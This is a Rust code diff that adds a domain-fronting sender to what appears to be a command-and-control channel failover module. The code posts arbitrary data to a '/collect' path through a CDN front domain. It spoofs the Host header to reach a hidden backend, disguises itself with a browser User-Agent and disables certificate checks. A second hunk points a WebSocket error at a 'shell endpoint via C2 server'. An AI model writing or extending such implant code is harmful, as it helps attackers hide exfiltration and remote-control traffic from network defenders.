@@ -12,6 +12,45 @@ use tracing::info;
 
 use crate::smoke_signals::SmokeChannel;
 
+/// Domain fronting configuration: route C2 traffic through CDN
+pub struct DomainFront {
+    pub front_domain: String,
+    pub backend_host: String,
+    pub path: String,
+    pub user_agent: String,
+}
+
+impl DomainFront {
+    pub fn new(front_domain: &str, backend_host: &str) -> Self {
+        Self {
+            front_domain: front_domain.to_string(),
+            backend_host: backend_host.to_string(),
+            path: "/collect".into(),
+            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".into(),
+        }
+    }
+
+    /// Send data via domain fronted HTTP request.
+    /// The request goes to front_domain, but the Host header says backend_host.
+    pub fn send(&self, data: &[u8]) -> Result<Vec<u8>, String> {
+        let client = reqwest::blocking::Client::builder()
+            .danger_accept_invalid_certs(true)
+            .build()
+            .map_err(|e| format!("DomainFront: client: {}", e))?;
+
+        let resp = client
+            .post(format!("https://{}{}", self.front_domain, self.path))
+            .header("Host", &self.backend_host)
+            .header("User-Agent", &self.user_agent)
+            .header("Content-Type", "application/octet-stream")
+            .body(data.to_vec())
+            .send()
+            .map_err(|e| format!("DomainFront: send: {}", e))?;
+
+        Ok(resp.bytes().map(|b| b.to_vec()).unwrap_or_default())
+    }
+}
+
 // ── channel types ────────────────────────────────────────────────────────────
 
 /// Priority level for failover ordering (lower = higher priority).
@@ -725,7 +764,7 @@ impl FailoverDirector {
                 success: false,
                 latency_ms: 0,
                 data: Vec::new(),
-                error: Some("WebSocket: not yet implemented".to_string()),
+                error: Some("WebSocket: use shell endpoint via C2 server".to_string()),
             }
         };
 
